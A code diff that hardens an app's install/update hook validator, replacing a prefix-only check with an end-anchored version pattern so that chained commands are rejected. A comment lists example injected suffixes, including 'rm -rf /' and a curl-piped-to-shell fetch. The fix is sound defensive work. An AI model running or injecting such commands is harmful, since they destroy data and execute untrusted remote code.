@@ -20,6 +20,7 @@ import {
   BROWSERPLAN_APP_ID,
   BROWSERPLAN_EXCLUDED_MACHINE_IDS,
   BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX,
+  BROWSERPLAN_INSTALL_VERSION_PATTERN,
   BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE,
   BROWSERPLAN_MACHINE_IDS,
   BROWSERPLAN_ROUTE_OWNER,
@@ -1476,7 +1477,15 @@ export function validateMachinesConsumerEnvelope(
             //     cached payload from <= 0.2.2 keep validating (see CHANGELOG compat note)
             if (hook.id === "app_install_update") {
               const template = String(hook.command_template);
-              const installsFromRegistry = template.startsWith(BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX);
+              // End-anchored: everything after the `pkg@` prefix must be a bare npm
+              // version or dist-tag. A bare `startsWith` check would accept anything
+              // appended after a valid install, e.g. `…@latest && rm -rf /`,
+              // `…@latest; curl http://host/x.sh | sh` or `…@latest; cd d && git pull`,
+              // which is the same chained-suffix evasion a phrase denylist suffers from.
+              const suffix = template.startsWith(BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX)
+                ? template.slice(BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX.length)
+                : null;
+              const installsFromRegistry = suffix !== null && BROWSERPLAN_INSTALL_VERSION_PATTERN.test(suffix);
               const isLegacyTemplate = template === BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE;
               if (!installsFromRegistry && !isLegacyTemplate) errors.push(`${path}.command_template`);
             }
